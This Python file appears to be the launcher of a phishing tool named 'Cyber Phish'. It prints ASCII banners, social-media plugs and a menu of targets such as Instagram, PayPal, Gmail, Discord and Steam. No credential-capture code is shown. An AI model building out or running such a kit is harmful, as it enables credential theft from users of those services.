import os
import random
try:
	from colorama import Fore, Style
except ModuleNotFoundError:
	os.system("pip install colorama")


from urllib.request import urlopen
from Core.helper.color import green, white, blue, red, start, alert
Version = "2.2"
yellow = ("\033[1;33;40m")


def connected(host='http://duckduckgo.com'):
    try:
        urlopen(host)
        return True
    except:
        return False



all_col = [Style.BRIGHT + Fore.RED, Style.BRIGHT + Fore.CYAN, Style.BRIGHT + Fore.LIGHTCYAN_EX,
			   Style.BRIGHT + Fore.LIGHTBLUE_EX, Style.BRIGHT + Fore.LIGHTCYAN_EX, Style.BRIGHT + Fore.LIGHTMAGENTA_EX,
			   Style.BRIGHT + Fore.LIGHTYELLOW_EX]

ran = random.choice(all_col)
def banner():

		print(Style.BRIGHT + Fore.LIGHTCYAN_EX, "\n", "- " * 4, " [+] Follow me on Instagram @cyber_dioxide ", "- " * 4)
		print(Style.BRIGHT + Fore.LIGHTYELLOW_EX, "\n", "- " * 4, " [+] Coding Instagram @cyber_dioxide_ ", "- " * 4)
		print(Style.BRIGHT + Fore.LIGHTRED_EX, "\n", "- " * 4, "[+] Github: https://github.com/Cyber-Dioxide/ ", "- " * 3)


banner()
        
def menu():
	print(blue +  " ██████╗██╗   ██╗██████╗ ███████╗██████╗" + white )
	print(white  +"██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗")
	print(blue +  "██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝")
	print(green + "██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗" + white+ blue + white)
	print(green + "╚██████╗   ██║   ██████╔╝███████╗██║  ██║")
	print(red +  "██████╗ ██╗  ██╗██╗███████╗██╗  ██╗" )
	print(white+ "██╔══██╗██║  ██║██║██╔════╝██║  ██║" + green)
	print(yellow+"██████╔╝███████║██║███████╗███████║" +  blue)
	print(yellow+"██╔═══╝ ██╔══██║██║╚════██║██╔══██║" + green)
	print(yellow+"██║     ██║  ██║██║███████║██║  ██║")
	print(red+   "╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝ ")

	banner()

	print(alert + " More Versions Will Come Soon Stay Updated, Follow My Github\n")
	print(white + "options:")
	print(green + "[" + white + "1" + green + "]" + white + " Instagram" + green + "			[" + white + "12" + green + "]" + white + " Paypal")
	print(green + "[" + white + "2" + green + "]" + white + " Facebook" + green + "			[" + white + "13" + green + "]" + white + " Discord")
	print(green + "[" + white + "3" + green + "]" + white + " Gmail" + green + "			[" + white + "14" + green + "]" + white + " Spotify")
	print(green + "[" + white + "4" + green + "]" + white + " Gmail (simple)" + green + "		[" + white + "15" + green + "]" + white + " Blockchain")
	print(green + "[" + white + "5" + green + "]" + white + " Twitter" + green + "			[" + white + "16" + green + "]" + white + " RiotGames")
	print(green + "[" + white + "6" + green + "]" + white + " Snapchat" + green + "			[" + white + "17" + green + "]" + white + " Rockstar")
	print(green + "[" + white + "7" + green + "]" + white + " Snapchat (simple)" + green + "		[" + white + "18" + green + "]" + white + " AskFM")
	print(green + "[" + white + "8" + green + "]" + white + " Steam" + green + "			[" + white + "19" + green + "]" + white + " 000Webhost")
	print(green + "[" + white + "9" + green + "]" + white + " Dropbox" + green)
	print(green + "[" + white + "10" + green + "]" + white + " Linkedin" + green + "			[" + white + "21" + green + "]" + white + " Gamehag")
	print(green + "[" + white + "11" + green + "]" + white + " Playstation" + green + "	        [" + white + "22" + green + "]" + white + " Mega")
	print(green + "-----------------------------------------------------------------------")
	print(green + "[" + white + "00" + green + "]" + red + " EXIT")
def Welcome():
	os.system("clear")
	
